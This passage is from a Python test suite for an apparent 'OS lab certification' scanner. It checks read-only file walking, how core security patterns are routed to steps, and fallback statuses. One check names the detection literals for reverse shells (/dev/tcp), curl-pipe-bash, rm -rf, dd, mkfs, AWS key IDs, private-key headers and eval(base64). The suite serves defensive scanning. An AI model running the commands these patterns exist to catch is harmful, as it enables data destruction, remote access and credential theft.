           capped.walk_truncated is True and capped.files_seen >= len(capped.files)
           and cap_fi.status == c.StepStatus.UNVERIFIED and cap_fi.evidence["walk_truncated"] is True
           and any(f.severity == "MEDIUM" and "walk capped" in f.detail for f in cap_fi.findings)
           and inv.walk_truncated is False and inv.files_seen >= len(inv.files)
           and c.run_static(_inv(CLEAN, **FULL)).step("file_inventory").status == c.StepStatus.PASS)
        ck("M2/M3: the walk is still read-only (no open(), no write/mkdir/unlink/chmod in certification.py)",
           "open(" not in SRC.replace("finditer(", "") and not re.search(r"\.(?:write_text|write_bytes|mkdir|unlink|rename|chmod|rmtree)\(", SRC))

    # ── (13) M6: core.security_scanner._COMPILED_PATTERNS is the ONE base table; nothing duplicated locally ──
    ck("M6: core table imported once at module top (try/except) and every core row is routed to exactly one OS-lab step",
       c._CORE is not None and len(c._CORE) >= 18
       and sum(len(c.core_for(s)) for s in c.CORE_STEPS) == len(c._CORE)
       and c.CORE_STEPS == {"network_destinations", "downloaded_binaries", "credential_reads", "privileged_ops", "obfuscation"})
    ck("M6: the 9 formerly-duplicated generic regexes are gone from certification.py (reverse shells, curl|bash, rm -rf, dd, mkfs, AKIA, RSA/EC key header, eval(base64))",
       not any(lit in SRC for lit in ("AKIA", "mkfs", "base64_decode", "/dev/tcp", "rm\\s+-rf", "dd\\s+if", "DROP\\s+TABLE",
                                       "|\\s*bash", "-O\\s*-", "(?:RSA |EC )?PRIVATE KEY-----\"")))
    saved = c._CORE
    try:
        c._CORE = None
        nocore = c.run_static(inv_fx := c.fixture_inventory())
    finally:
        c._CORE = saved
    ck("M6: without the core table every core-backed step is UNVERIFIED with reason 'core scanner table unavailable' — never a silent built-in-only sweep",
       all(nocore.step(s).status == c.StepStatus.UNVERIFIED and nocore.step(s).note == c.CORE_UNAVAILABLE for s in c.CORE_STEPS)
       and all(rep.step(s).note != c.CORE_UNAVAILABLE for s in c.CORE_STEPS))
    ck("M6: OS-lab-specific local findings still surface without the core table, and local HIGHs still REJECT",
       any(f.path == "keyreader.py" for f in nocore.step("credential_reads").findings)
       and nocore.step("persistence").status == c.StepStatus.FAIL and nocore.verdict == Verdict.REJECTED
       and len(inv_fx.files) == 8)

    n, ok = len(res), sum(res)
    print(f"\nOS LAB CERTIFICATION TESTS: {ok}/{n} —", "PASS" if ok == n else "FAIL")
    return ok == n


def test_certification():
    assert run()


if __name__ == "__main__":
    raise SystemExit(0 if run() else 1)
